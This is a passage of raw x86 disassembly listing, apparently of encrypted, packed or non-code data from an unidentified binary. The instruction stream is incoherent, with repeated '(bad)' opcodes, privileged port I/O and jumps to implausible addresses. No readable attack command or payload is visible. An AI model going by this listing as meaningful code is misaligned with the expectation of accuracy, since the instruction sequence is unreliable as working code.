  40c73b:	(bad)  
  40c73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73d:	add    eax,0xaa5d4474
  40c742:	mov    ch,0x51
  40c744:	loop   0x40c738
  40c746:	push   0xf4158dae
  40c74b:	shr    DWORD PTR [ecx],cl
  40c74d:	xor    BYTE PTR [esi],0xac
  40c750:	(bad)  
  40c751:	mov    al,ds:0x6bc9c1bb
  40c756:	xchg   ecx,eax
  40c757:	ja     0x40c740
  40c759:	or     eax,0xffffffe0
  40c75c:	enter  0xcb70,0xc5
  40c760:	push   ss
  40c761:	xor    DWORD PTR [eax+edi*1+0x48],0xffffffc0
  40c766:	sub    edx,ebp
  40c768:	sub    eax,0xc7cb2f84
  40c76d:	(bad)  
  40c76e:	xor    al,0x59
  40c770:	and    ebp,DWORD PTR [ebp+0x7a]
  40c773:	sub    bl,BYTE PTR [edx+0x67]
  40c776:	daa    
  40c777:	clc    
  40c778:	xor    al,0xb6
  40c77a:	sbb    BYTE PTR [edx+0x79780476],bl
  40c780:	xchg   ebp,eax
  40c781:	dec    edx
  40c782:	jmp    0x40c74f
  40c784:	inc    edx
  40c785:	inc    edx
  40c786:	jmp    0x742e9144
  40c78b:	adc    DWORD PTR [eax+0x7d],0x50dba28a
  40c792:	dec    ebx
  40c793:	lock add al,0xc5
  40c796:	int    0x76
  40c798:	test   al,0x7f
  40c79a:	dec    eax
  40c79b:	adc    DWORD PTR [edi+eiz*2+0x15],0x1a3de14b
  40c7a3:	dec    ebp
  40c7a4:	js     0x40c7bc
  40c7a6:	adc    DWORD PTR [ecx-0x22ac7558],ebp
  40c7ac:	mov    ebx,0xd1a54ccb
  40c7b1:	pushf  
  40c7b2:	xchg   edi,eax
  40c7b3:	call   0xbd41c897
  40c7b8:	xchg   ebx,eax
  40c7b9:	inc    esp
  40c7ba:	pop    eax
  40c7bb:	mov    bl,0x5a
  40c7bd:	mov    al,ds:0x55921a20
  40c7c2:	mov    ebx,0x992f1d6b
  40c7c7:	xor    ah,BYTE PTR [esi+0x15122452]
  40c7cd:	out    0x58,al
  40c7cf:	mov    cl,BYTE PTR [esi-0x2b1f95c2]
  40c7d5:	cmp    BYTE PTR [esi],0x1a
  40c7d8:	fadd   DWORD PTR [edx-0x4]
  40c7db:	ror    BYTE PTR [edi+eiz*8+0x69],0x4
  40c7e0:	push   ds
  40c7e1:	or     ah,BYTE PTR [edi+0x4740425d]
  40c7e7:	pop    edi
  40c7e8:	or     al,0xe3
  40c7ea:	push   esi
  40c7eb:	jmp    0x69a3ac29
  40c7f0:	inc    ebp
  40c7f1:	inc    ebp
  40c7f2:	cmc    
  40c7f3:	dec    ebp
  40c7f4:	dec    ecx
  40c7f5:	mov    bh,0xb0
  40c7f7:	push   esp
  40c7f8:	xor    al,0x9a
  40c7fa:	jmp    0x6cd3b18
  40c7ff:	cmp    BYTE PTR [edi],al
  40c801:	pop    ecx
  40c802:	cdq    
  40c803:	mov    ch,0x44
  40c805:	in     al,0xe8
  40c807:	loope  0x40c7b5
  40c809:	sub    BYTE PTR [ebx-0x47],al
  40c80c:	pop    edx
  40c80d:	lock sbb ch,ch
  40c810:	das    
  40c811:	push   ss
  40c812:	xor    al,ah
  40c814:	add    dh,al
  40c816:	jmp    0x40c81d
  40c818:	shr    bh,cl
  40c81a:	lds    eax,FWORD PTR [eax-0x18]
  40c81d:	cmp    esp,esp
  40c81f:	icebp  
  40c820:	sbb    esp,DWORD PTR [eax+0x11]
  40c823:	inc    ebx
  40c824:	push   esi
  40c825:	gs pop esi
  40c827:	dec    eax
  40c828:	not    DWORD PTR [edx+0x38ab68ab]
  40c82e:	add    DWORD PTR [ecx],esp
  40c830:	pop    ds
  40c831:	add    BYTE PTR [esi+0x7be2c25e],dl
  40c837:	imul   eax,DWORD PTR [edi+0x310d9e5],0xad9304ce
  40c841:	mov    cl,0xc7
  40c843:	mov    dh,0xeb
  40c845:	and    bh,BYTE PTR [ecx-0x5]
  40c848:	or     eax,0xefcfc5fb
  40c84d:	int    0x5e
  40c84f:	jbe    0x40c8c4
  40c851:	enter  0xfe5e,0x6b
  40c855:	xchg   edx,eax
  40c856:	scas   eax,DWORD PTR es:[edi]
  40c857:	xchg   edx,eax
  40c858:	push   0x34
  40c85a:	fs (bad) 
  40c85c:	mov    bh,0xe1
  40c85e:	or     ch,BYTE PTR [ebx+0x50]
  40c861:	int3   
  40c862:	outs   dx,DWORD PTR ds:[esi]
  40c863:	jge    0x40c8c1
  40c865:	jmp    0x2b8a67b2
  40c86a:	ds icebp 
  40c86c:	clc    
  40c86d:	xchg   ebp,eax
  40c86e:	mov    ch,0xcf
  40c870:	leave  
  40c871:	fiadd  DWORD PTR [edx-0x79c46f95]
  40c877:	les    edx,FWORD PTR [edi]
  40c879:	and    BYTE PTR [edi-0x39],dl
  40c87c:	shl    DWORD PTR [esi+0x79608c74],cl
  40c882:	mov    WORD PTR [edx+edi*4],es
  40c885:	adc    DWORD PTR ds:0x33b59892,esp
  40c88b:	fsubr  QWORD PTR [edi]
  40c88d:	sbb    BYTE PTR [edx-0x11e9b3b8],al
  40c893:	cmc    
  40c894:	cmp    ebp,ebx
  40c896:	jge    0x40c8be
  40c898:	punpckhbw mm1,QWORD PTR [ecx]
  40c89b:	xchg   DWORD PTR [ebp-0x6e],esi
  40c89e:	(bad)  
  40c8a0:	int    0x52
  40c8a2:	dec    esp
  40c8a3:	lahf   
  40c8a4:	sbb    DWORD PTR [esi-0xe],ebp
  40c8a7:	dec    edi
  40c8a8:	add    ecx,DWORD PTR [ecx]
  40c8aa:	xchg   esp,eax
  40c8ab:	pop    es
  40c8ac:	xor    edx,DWORD PTR [esi-0x7d4f6ce0]
  40c8b2:	sub    ch,BYTE PTR [edx+0x8]
  40c8b5:	mov    bh,0xb1
  40c8b7:	cmp    eax,ebx
  40c8b9:	inc    ebp
  40c8ba:	mov    eax,0xfacd975c
  40c8bf:	pop    esi
  40c8c0:	(bad)  
  40c8c1:	ret    
  40c8c2:	imul   edx,DWORD PTR [esi-0x40],0xffffffc0
  40c8c6:	out    dx,al
  40c8c7:	bound  edi,QWORD PTR [edx-0x42]
  40c8ca:	je     0x40c8cf
  40c8cc:	das    
  40c8cd:	sub    al,0xc8
  40c8cf:	(bad)  
  40c8d1:	mov    al,ds:0x83c999b4
  40c8d6:	lods   eax,DWORD PTR ds:[esi]
  40c8d7:	fisttp WORD PTR [ebx+ebp*1]
  40c8da:	dec    eax
  40c8db:	xchg   edi,eax
  40c8dc:	pusha  
  40c8dd:	add    eax,0xc4ea4772
  40c8e2:	and    DWORD PTR [ebx+0x1c299faa],ebx
  40c8e8:	xor    BYTE PTR [eax-0x17],cl
  40c8eb:	adc    edi,DWORD PTR [ebp+edx*4-0x6b25671a]
  40c8f2:	pop    edx
  40c8f3:	scas   eax,DWORD PTR es:[edi]
  40c8f4:	adc    cl,BYTE PTR [eax+ebx*8+0x8a30e1d]
  40c8fb:	jmp    0x40c974
  40c8fd:	lods   al,BYTE PTR ds:[esi]
  40c8fe:	push   0xfffffffc
  40c900:	ret    0x1ee4
  40c903:	mov    ds:0xd57b0d74,eax
  40c908:	ret    
  40c909:	add    bh,BYTE PTR [edx-0x357aea57]
  40c90f:	jl     0x40c904
  40c911:	inc    ecx
  40c912:	mov    esp,0x21c63997
  40c917:	push   ds
  40c918:	mov    ?,WORD PTR [edi+eax*2]
  40c91b:	sbb    dl,ah
  40c91d:	clc    
  40c91e:	mov    ?,WORD PTR [eax+ecx*4]
  40c921:	dec    esp
  40c922:	inc    edi
  40c923:	test   BYTE PTR [edx+ecx*4-0x510a05bc],ah
  40c92a:	xchg   esp,eax
  40c92b:	inc    ebx
  40c92c:	push   0x54
  40c92e:	daa    
  40c92f:	pop    esi
  40c930:	sbb    al,0xce
  40c932:	mov    eax,ds:0xf6b6b6fa
  40c937:	jmp    0xcb1d4e93
  40c93c:	cld    
  40c93d:	add    BYTE PTR [edi],bh
  40c93f:	sti    
  40c940:	or     bh,bh
  40c942:	div    DWORD PTR [edx]
  40c944:	icebp  
  40c945:	xchg   BYTE PTR [ecx+0x58],bl
  40c948:	xchg   ebx,eax
  40c949:	in     al,0xb8
  40c94b:	fistp  DWORD PTR [eax-0x57e86fac]
  40c951:	pop    ds
  40c952:	cmp    cl,BYTE PTR [ebx-0x4c]
  40c955:	mov    eax,DWORD PTR [ecx-0x6d]
  40c958:	jg     0x40c8ff
  40c95a:	outs   dx,BYTE PTR ds:[esi]
  40c95b:	cmp    ch,BYTE PTR [eax-0x47]
  40c95e:	mov    DWORD PTR [eax+0x3b],ebp
  40c961:	jle    0x40c8ff
  40c963:	push   ebx
  40c964:	add    DWORD PTR ds:0x3d8c22cb,esi
  40c96a:	and    al,BYTE PTR [ebp+0x27]
  40c96d:	mov    bl,0xad
  40c96f:	xchg   edx,eax
  40c970:	mov    dl,0xb1
  40c972:	adc    BYTE PTR [esi+eax*2-0x71],bl
  40c976:	stc    
  40c977:	outs   dx,DWORD PTR ds:[esi]
  40c978:	jo     0x40c9a3
  40c97a:	push   0x9
  40c97c:	js     0x40c919
  40c97e:	inc    esp
  40c97f:	ret    
  40c980:	stos   DWORD PTR es:[edi],eax
  40c981:	inc    ecx
  40c982:	xor    bl,BYTE PTR [edx-0x2f]
  40c985:	push   ecx
  40c986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c988:	not    DWORD PTR [ebp+0x11]
  40c98b:	ja     0x40c98b
  40c98d:	mov    dl,0x4
  40c98f:	cmp    al,dl
  40c991:	ins    BYTE PTR es:[edi],dx
  40c992:	mov    cl,0x6e
  40c994:	or     BYTE PTR [eax-0x61],bl
  40c997:	inc    edx
  40c998:	cmp    al,0x24
  40c99a:	mov    ch,0xdf
  40c99c:	lods   al,BYTE PTR ds:[esi]
  40c99d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c99e:	mov    dl,0xc8
  40c9a0:	inc    ecx
  40c9a1:	or     DWORD PTR [ebx],0x661ddfc7
  40c9a7:	paddusw mm6,mm2
  40c9aa:	test   cl,ah
  40c9ac:	push   eax
  40c9ad:	hlt    
  40c9ae:	or     eax,0x1ef7a88c
  40c9b3:	cmp    edi,ebx
  40c9b5:	inc    esp
  40c9b6:	arpl   WORD PTR [edx+0xc72ec80],di
  40c9bc:	call   0x8f37:0xa7c50695
  40c9c3:	(bad)  
  40c9c4:	jmp    0x7f16a6df
  40c9c9:	inc    eax
  40c9ca:	lahf   
  40c9cb:	iret   
  40c9cc:	ficom  DWORD PTR ds:0x15f7457b
  40c9d2:	stc    
  40c9d3:	jb     0x40c962
  40c9d5:	adc    BYTE PTR [ebx],cl
  40c9d7:	pop    esp
  40c9d8:	pop    esi
  40c9d9:	outs   dx,BYTE PTR ds:[esi]
  40c9da:	xchg   ebx,eax
  40c9db:	shl    DWORD PTR [esi+0x22f0f7cc],0xdc
  40c9e2:	adc    bl,BYTE PTR [esi+eax*2-0x6b]
  40c9e6:	in     eax,0x85
  40c9e8:	xor    BYTE PTR [ecx+0x5163968],ah
  40c9ee:	psrad  mm2,0xc7
  40c9f2:	adc    bl,BYTE PTR [edi-0x207a732]
  40c9f8:	test   bl,bl
  40c9fa:	ins    BYTE PTR es:[edi],dx
  40c9fb:	sub    ebx,edx
  40c9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9fe:	cdq    
  40c9ff:	xchg   ebx,eax
  40ca00:	xor    BYTE PTR ds:0x79789281,ch
  40ca06:	jbe    0x40c996
  40ca08:	xor    DWORD PTR [ebp-0x3a],esp
  40ca0b:	sub    DWORD PTR [eax-0x1b],eax
  40ca0e:	mov    dl,0x99
  40ca10:	xchg   ebp,eax
  40ca11:	pop    edx
  40ca12:	pop    esi
  40ca13:	push   ebp
  40ca14:	jg     0x40ca73
  40ca16:	ret    0xe7ad
  40ca19:	fwait
  40ca1a:	dec    esi
  40ca1b:	shl    DWORD PTR [eax+0x65ef61f6],1
  40ca21:	mov    ecx,0x4e560cb7
  40ca26:	mov    edi,0xc83e4609
  40ca2b:	ins    BYTE PTR es:[edi],dx
  40ca2c:	inc    ecx
  40ca2d:	inc    esp
  40ca2e:	mov    dh,0x3d
  40ca30:	fstp   DWORD PTR [edx-0x7]
  40ca33:	pop    ss
  40ca34:	out    dx,al
  40ca35:	sub    ebp,ebp
  40ca37:	xchg   edx,eax
  40ca38:	fmulp  st(0),st
  40ca3a:	aaa    
  40ca3b:	daa    
  40ca3c:	mov    cl,0xde
  40ca3e:	dec    edi
  40ca3f:	(bad)  
  40ca40:	int    0x92
  40ca42:	xchg   edx,eax
  40ca43:	aam    0xfe
  40ca45:	xor    BYTE PTR [eax-0x7e1b6304],cl
  40ca4b:	imul   BYTE PTR [edx+0x5e]
  40ca4e:	icebp  
  40ca4f:	mov    ebp,0xf794f545
  40ca54:	in     al,dx
  40ca55:	scas   al,BYTE PTR es:[edi]
  40ca56:	lds    esi,FWORD PTR [eax-0x6c007241]
  40ca5c:	mov    esi,0x10a100aa
  40ca61:	sub    ch,BYTE PTR [eax]
  40ca63:	(bad)  
  40ca64:	fdivp  st(4),st
  40ca66:	cs jae 0x40ca97
  40ca69:	sub    BYTE PTR [ebp-0x43],0x7c
  40ca6d:	lock pop edi
  40ca6f:	std    
  40ca70:	out    dx,al
  40ca71:	mul    DWORD PTR [edi+0x248f0ff4]
  40ca77:	arpl   si,cx
  40ca79:	(bad)  
  40ca7a:	xchg   ebp,eax
  40ca7b:	mov    ebx,0x15445115
  40ca80:	pop    esi
  40ca81:	repnz popa 
  40ca83:	mov    esp,0x1ddf9e88
  40ca88:	les    eax,FWORD PTR [ecx]
  40ca8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca8b:	jl     0x40ca4b
  40ca8d:	in     al,dx
  40ca8e:	mov    ds:0x9e80acd2,al
  40ca93:	shl    DWORD PTR [ebp+0x7ff102a5],cl
  40ca99:	push   ds
  40ca9a:	aaa    
  40ca9b:	pop    ss
  40ca9c:	es mov bl,0x8a
  40ca9f:	(bad)  
  40caa0:	or     eax,0xc570459
  40caa5:	adc    dl,BYTE PTR [eax]
  40caa7:	push   esp
  40caa8:	pop    ds
  40caa9:	mov    bh,0x3b
  40caab:	dec    eax
  40caac:	lods   al,BYTE PTR ds:[esi]
  40caad:	and    dl,BYTE PTR [ebx+0x52]
  40cab0:	neg    BYTE PTR [eax]
  40cab2:	dec    ecx
  40cab3:	ss stos DWORD PTR es:[edi],eax
  40cab5:	xchg   ebp,eax
  40cab6:	lods   al,BYTE PTR ds:[esi]
  40cab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab8:	mov    eax,DWORD PTR [ebp+0x5c]
  40cabb:	cmp    dh,0xad
  40cabe:	xchg   ebx,eax
  40cabf:	push   0xffffffea
  40cac1:	int3   
  40cac2:	or     al,0xe5
  40cac4:	mov    edi,esp
  40cac6:	sar    DWORD PTR [ebx-0x3eaacd79],0xab
  40cacd:	dec    ebx
  40cace:	popa   
  40cacf:	icebp  
  40cad0:	je     0x40cae0
  40cad2:	cs xchg edx,eax
  40cad4:	popa   
  40cad5:	xor    DWORD PTR [ecx],0x59200590
  40cadb:	lods   eax,DWORD PTR ds:[esi]
  40cadc:	dec    edi
  40cadd:	xchg   BYTE PTR [edi+ebp*4],cl
  40cae0:	out    dx,eax
  40cae1:	jl     0x40cb32
  40cae3:	ss jg  0x40cabd
  40cae6:	retf   
  40cae7:	xchg   esp,eax
  40cae8:	dec    ebp
  40cae9:	xchg   ebx,eax
  40caea:	imul   esi
  40caec:	rol    DWORD PTR [ebx],cl
  40caee:	adc    DWORD PTR [ecx-0x41],edx
  40caf1:	xchg   edx,eax
  40caf2:	add    eax,0x8fa320e4
  40caf7:	sub    DWORD PTR [eax-0x10],esi
  40cafa:	out    dx,eax
  40cafb:	test   BYTE PTR [esi-0x6d065709],ah
  40cb01:	jge    0x40cafe
  40cb03:	lods   eax,DWORD PTR ds:[esi]
  40cb04:	les    esi,FWORD PTR [esp+eax*8-0x628c968a]
  40cb0b:	mov    al,ds:0xe4ddf78
  40cb10:	in     al,0x3c
  40cb12:	imul   DWORD PTR [ebp+0x2]
  40cb15:	pcmpeqd mm2,mm4
  40cb18:	clc    
  40cb19:	push   esi
  40cb1a:	aam    0xd3
  40cb1c:	inc    edx
  40cb1d:	xor    ch,ch
  40cb1f:	in     eax,dx
  40cb20:	frstor [ebx+0x11783b92]
  40cb26:	in     al,dx
  40cb27:	mov    dh,0x76
  40cb29:	pop    ss
  40cb2a:	inc    ebx
  40cb2b:	ret    0x9eb4
  40cb2e:	pop    esp
  40cb2f:	cwde   
  40cb30:	sbb    DWORD PTR [ebx-0x16],edi
  40cb33:	cwde   
  40cb34:	fwait
  40cb35:	icebp  
  40cb36:	daa    
  40cb37:	into   
  40cb38:	(bad)  
  40cb39:	sbb    esp,DWORD PTR ds:0xb78fa4b0
  40cb3f:	out    dx,eax
  40cb40:	cmp    eax,0x5d93bc2c
  40cb45:	mov    ds:0x181426b2,al
  40cb4a:	sti    
  40cb4b:	dec    edi
  40cb4c:	xchg   esi,eax
  40cb4d:	outs   dx,BYTE PTR ds:[esi]
  40cb4e:	mov    bh,0x37
  40cb50:	imul   ebx,esi,0x5af5782e
  40cb56:	out    dx,al
  40cb57:	in     eax,dx
  40cb58:	jae    0x40cb94
  40cb5a:	mov    eax,0xa7ce478
  40cb5f:	pop    esp
  40cb60:	arpl   WORD PTR [edx+0x1f68dadd],bx
  40cb66:	into   
  40cb67:	mov    bh,0xe5
  40cb69:	or     al,0xe3
  40cb6b:	(bad)  [edi-0x2d]
  40cb6e:	jp     0x40cb13
  40cb70:	and    eax,0x9c0ae79a
  40cb75:	es inc ebx
  40cb77:	hlt    
  40cb78:	mov    BYTE PTR [ecx-0x4],bl
  40cb7b:	sub    BYTE PTR [edx],al
  40cb7d:	aas    
  40cb7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb7f:	jb     0x40cbc6
  40cb81:	adc    cl,dh
  40cb83:	xchg   esp,eax
  40cb84:	cwde   
  40cb85:	and    eax,0x8eebf414
  40cb8a:	in     al,0x4a
  40cb8c:	and    edx,esp
  40cb8e:	clc    
  40cb8f:	(bad)  
  40cb91:	popf   
  40cb92:	sti    
  40cb93:	lods   al,BYTE PTR ds:[esi]
  40cb94:	nop
  40cb95:	mul    BYTE PTR [ecx]
  40cb97:	adc    bh,dl
  40cb99:	mov    gs,WORD PTR [esi+0x4138d191]
  40cb9f:	call   0xe4af:0x445f1b8b
  40cba6:	ror    bl,0xe7
  40cba9:	stc    
  40cbaa:	ret    0xd34c
  40cbad:	add    DWORD PTR [eax-0x2c],edx
  40cbb0:	sbb    bh,bl
  40cbb2:	lock mov edx,0xadd5a050
  40cbb8:	fdivrp st(3),st
  40cbba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbbb:	jno    0x40cc38
  40cbbd:	mov    ebx,0x3334dca1
  40cbc2:	sub    DWORD PTR [ebx],ebp
  40cbc4:	ins    BYTE PTR es:[edi],dx
  40cbc5:	xor    al,BYTE PTR [ebp-0x79be37c2]
  40cbcb:	call   0xe44d:0xe564cf67
  40cbd2:	push   ss
  40cbd3:	enter  0xa686,0xb4
  40cbd7:	adc    DWORD PTR [eax],eax
  40cbd9:	sbb    BYTE PTR [ecx],ch
  40cbdb:	push   edx
  40cbdc:	sub    dl,BYTE PTR [edi+0x67]
  40cbdf:	mov    esp,0xfca13a57
  40cbe4:	mov    dh,0x2d
  40cbe6:	xor    ebp,esi
  40cbe8:	pushf  
  40cbe9:	mov    bl,0x75
  40cbeb:	and    eax,0xa675a2c3
  40cbf0:	xor    eax,DWORD PTR [edi+0x2a3d5196]
  40cbf6:	jno    0x40cb97
  40cbf8:	test   eax,0x9eaa5716
  40cbfd:	mov    dh,0xbc
  40cbff:	test   eax,0x1efa8cbc
  40cc04:	and    DWORD PTR [ebx],ebp
  40cc06:	retf   
  40cc07:	lods   al,BYTE PTR ds:[esi]
  40cc08:	pop    ss
  40cc09:	in     eax,0x16
  40cc0b:	cli    
  40cc0c:	sub    edi,esi
  40cc0e:	inc    edi
  40cc0f:	or     edx,DWORD PTR [edi+0x1c]
  40cc12:	jecxz  0x40cc00
  40cc14:	cld    
  40cc15:	cmp    DWORD PTR ds:0x6068524f,esi
  40cc1b:	push   eax
  40cc1c:	jg     0x40cc3a
  40cc1e:	outs   dx,DWORD PTR ds:[esi]
  40cc1f:	arpl   sp,dx
  40cc21:	ja     0x40cc52
  40cc23:	call   FWORD PTR [ebx+0x70c20d6c]
  40cc29:	push   0x1165482a
  40cc2e:	aad    0x69
  40cc30:	cmc    
  40cc31:	sbb    eax,ebx
  40cc33:	xor    DWORD PTR [ecx],0x53
  40cc36:	fdivr  QWORD PTR [edx-0x29f0369b]
  40cc3c:	ret    
  40cc3d:	clc    
  40cc3e:	stos   DWORD PTR es:[edi],eax
  40cc3f:	adc    DWORD PTR [edx],ecx
  40cc41:	push   ebx
  40cc42:	adc    edi,esp
  40cc44:	push   eax
  40cc45:	dec    ebp
  40cc46:	in     al,dx
  40cc47:	and    ch,BYTE PTR [ebx-0x2d]
  40cc4a:	xor    cl,BYTE PTR [eax+0x4d]
  40cc4d:	dec    ebp
  40cc4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc4f:	not    DWORD PTR [esi+0x2]
  40cc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc53:	cmp    DWORD PTR [ebx],0x19603f9e
  40cc59:	nop
  40cc5a:	loopne 0x40ccdb
  40cc5c:	ss xchg esi,eax
  40cc5e:	pop    ds
  40cc5f:	and    DWORD PTR [esi-0x554edd02],edx
  40cc65:	xchg   edx,eax
  40cc66:	mov    es,ebp
  40cc68:	mov    dh,0xb8
  40cc6a:	push   ds
  40cc6b:	or     al,BYTE PTR [eax+0x78e85194]
  40cc71:	and    eax,0x1ef62b91
  40cc76:	mov    bl,0x35
  40cc78:	pop    ds
  40cc79:	mov    cl,BYTE PTR [ecx]
  40cc7b:	retf   0x2989
  40cc7e:	jl     0x40cc22
  40cc80:	and    ebx,DWORD PTR [esi+0x3f67b518]
  40cc86:	lea    esp,[ecx]
  40cc88:	push   es
  40cc89:	or     DWORD PTR [ebx+ecx*1],edi
  40cc8c:	or     ch,ah
  40cc8e:	cli    
  40cc8f:	add    BYTE PTR [ebp-0xa3be541],0x5b
  40cc96:	xchg   DWORD PTR [ecx+0xa],ebx
  40cc99:	test   ah,bl
  40cc9b:	aad    0x3d
  40cc9d:	test   DWORD PTR [edi],ebx
  40cc9f:	cmp    ebx,DWORD PTR [ebx-0xd]
  40cca2:	(bad)  
  40cca5:	cwde   
  40cca6:	enter  0x85a1,0x58
  40ccaa:	sahf   
  40ccab:	push   cs
  40ccac:	out    dx,eax
  40ccad:	mov    WORD PTR [esi+0x69],fs
  40ccb0:	jge    0x40cd1b
  40ccb2:	loope  0x40cd01
  40ccb4:	imul   ebp,DWORD PTR [ebp-0x4a026f71],0x2cfb6c3d
  40ccbe:	add    eax,0x9b57ee36
  40ccc3:	popf   
  40ccc4:	xor    ebx,DWORD PTR [ecx+0x2b5139d3]
  40ccca:	push   esi
  40cccb:	mov    eax,ds:0xf6be732
  40ccd0:	mov    bh,0x50
  40ccd2:	adc    BYTE PTR ds:0x63fa7a25,bh
  40ccd8:	mov    cs,eax
  40ccda:	mov    BYTE PTR [edi+0x50],0xf1
  40ccde:	sub    al,0xcf
  40cce0:	and    cl,bh
  40cce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce3:	out    dx,al
  40cce4:	mov    gs,WORD PTR [ecx-0x653274b5]
  40ccea:	rcr    BYTE PTR [ecx-0x74b60a27],0x5d
  40ccf1:	mov    ds:0x55c77a1a,al
  40ccf6:	mov    bl,0x54
  40ccf8:	mov    dl,BYTE PTR [eax-0x69b8fdb6]
  40ccfe:	test   BYTE PTR [edx],cl
  40cd00:	out    0x1a,al
  40cd02:	push   ebp
  40cd03:	or     esi,edx
  40cd05:	or     ebp,DWORD PTR [ebx]
  40cd07:	jae    0x40cd26
  40cd09:	mov    dl,bl
  40cd0b:	or     DWORD PTR [esi+0x1d],eax
  40cd0e:	or     al,0xa1
  40cd10:	mov    edi,0x7223918c
  40cd15:	dec    esi
  40cd16:	loopne 0x40cd67
  40cd18:	xor    DWORD PTR [edi+edx*4+0x31],ecx
  40cd1c:	pop    es
  40cd1d:	lea    eax,[edx-0x3c]
  40cd20:	dec    eax
  40cd21:	test   al,0xea
  40cd23:	xchg   edi,eax
  40cd24:	loop   0x40cd0a
  40cd26:	push   esp
  40cd27:	mov    ebx,0xa89e4d62
  40cd2c:	outs   dx,DWORD PTR ds:[esi]
  40cd2d:	int    0xda
  40cd2f:	cld    
  40cd30:	adc    BYTE PTR [ebp-0x5bf15ed0],0x5f
  40cd37:	mov    bl,0x8b
  40cd39:	stos   DWORD PTR es:[edi],eax
  40cd3a:	push   ebx
  40cd3b:	xchg   edx,eax
  40cd3c:	(bad)  
  40cd3d:	mov    al,ds:0xb4da23eb
  40cd42:	aaa    
  40cd43:	jbe    0x40cd10
  40cd45:	je     0x40cd29
  40cd47:	push   ebp
  40cd48:	jnp    0x40cd53
  40cd4a:	cmc    
  40cd4b:	cmp    bl,BYTE PTR [eax]
  40cd4d:	test   eax,0x9f2fa114
  40cd52:	add    DWORD PTR [ebp-0x53ef9d5],0x8a6a8ac
  40cd5c:	pusha  
  40cd5d:	jnp    0x40cda2
  40cd5f:	mov    ds:0xe1155fdc,eax
  40cd64:	mov    esp,0x95c78463
  40cd69:	mov    eax,DWORD PTR [edx]
  40cd6b:	jl     0x40cda7
  40cd6d:	jbe    0x40cdc2
  40cd6f:	or     BYTE PTR [edx-0x76a51036],dl
  40cd75:	pop    ss
  40cd76:	mov    esp,0x7b56e85c
  40cd7b:	inc    edx
  40cd7c:	or     ecx,DWORD PTR [ebp+ebp*2-0x42]
  40cd80:	and    ebp,DWORD PTR [edx]
  40cd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd83:	pop    edi
  40cd84:	je     0x40cdfc
  40cd86:	jb     0x40cdde
  40cd88:	xor    BYTE PTR [eax+0x44],dl
  40cd8b:	adc    bl,BYTE PTR ds:0x889f9674
  40cd91:	fisttp WORD PTR [ebx+esi*4+0x2e976f5]
  40cd98:	fcomp  QWORD PTR [ebx+0x33a5d76c]
  40cd9e:	(bad)  
  40cd9f:	xor    ecx,DWORD PTR [edi+0x5c]
  40cda2:	mov    DWORD PTR [edx+0x9c78a22],0x12999ad6
  40cdac:	sbb    ebx,ebp
  40cdae:	(bad)  
  40cdaf:	frstor [ebp+0x4cd86474]
  40cdb5:	jp     0x40ce03
  40cdb7:	pop    esi
  40cdb8:	retf   0xc40a
  40cdbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdbc:	mov    dl,0xd0
  40cdbe:	push   esi
  40cdbf:	jnp    0x40cd41
  40cdc1:	rol    BYTE PTR [eax-0x1],0x4d
  40cdc5:	js     0x40cd4b
  40cdc7:	and    eax,DWORD PTR ds:0xe612e023
  40cdcd:	pop    edx
  40cdce:	adc    ebx,DWORD PTR [edi-0x6dbf195f]
  40cdd4:	in     eax,dx
  40cdd5:	jnp    0x40cdbd
  40cdd7:	mov    esi,0x4dc2dc76
  40cddc:	imul   esp
  40cdde:	mov    esi,0x896e51c7
  40cde3:	ret    0x96a8
  40cde6:	mov    bh,cl
  40cde8:	cmp    bh,0xff
  40cdeb:	mov    ebp,0xa1bdf8ca
  40cdf0:	dec    ebx
  40cdf1:	or     BYTE PTR [esi],dh
  40cdf3:	and    DWORD PTR [esi+0x40a5d99],0x181c220d
  40cdfd:	push   ebx
  40cdfe:	(bad)  
  40cdff:	push   0xdc6a992c
  40ce04:	jno    0x40ce7c
  40ce06:	fldenv [ecx]
  40ce08:	jo     0x40cde3
  40ce0a:	pusha  
  40ce0b:	adc    BYTE PTR [ebx],dl
  40ce0d:	sub    al,BYTE PTR [ebx]
  40ce0f:	inc    edx
  40ce10:	xchg   ecx,eax
  40ce11:	mov    ds:0xc237f78c,al
  40ce16:	and    esi,DWORD PTR fs:[ecx]
  40ce19:	in     al,0x7d
  40ce1b:	pusha  
  40ce1c:	pop    ecx
  40ce1d:	lock cmp cl,al
  40ce20:	out    dx,al
  40ce21:	inc    ebx
  40ce22:	xor    eax,0xe36a23a4
  40ce27:	pop    es
  40ce28:	xchg   DWORD PTR [esi],ebx
  40ce2a:	pop    edx
  40ce2b:	cmp    DWORD PTR [esi-0x11a1472c],esi
  40ce31:	ins    BYTE PTR es:[edi],dx
  40ce32:	jmp    0x51d8:0xec2fbf75
  40ce39:	and    DWORD PTR [ecx+edx*2+0x65],0xffffffe2
  40ce3e:	pop    ecx
  40ce3f:	sbb    bh,BYTE PTR [edi-0x69]
  40ce42:	inc    ebp
  40ce43:	les    ebx,FWORD PTR [ecx+ebx*2+0xc]
  40ce47:	mov    esi,DWORD PTR [ecx+0xc]
  40ce4a:	int3   
  40ce4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce4c:	ror    esi,1
  40ce4e:	mov    cl,0x75
  40ce50:	sar    BYTE PTR [ebx],1
  40ce52:	call   0xcf91:0x7b62dc16
  40ce59:	inc    ecx
  40ce5a:	outs   dx,DWORD PTR ds:[esi]
  40ce5b:	call   0x8958aafc
  40ce60:	mov    esi,0xdc861777
  40ce65:	aam    0x77
  40ce67:	icebp  
  40ce68:	inc    ebp
  40ce69:	out    dx,eax
  40ce6a:	sub    eax,0xa2b27760
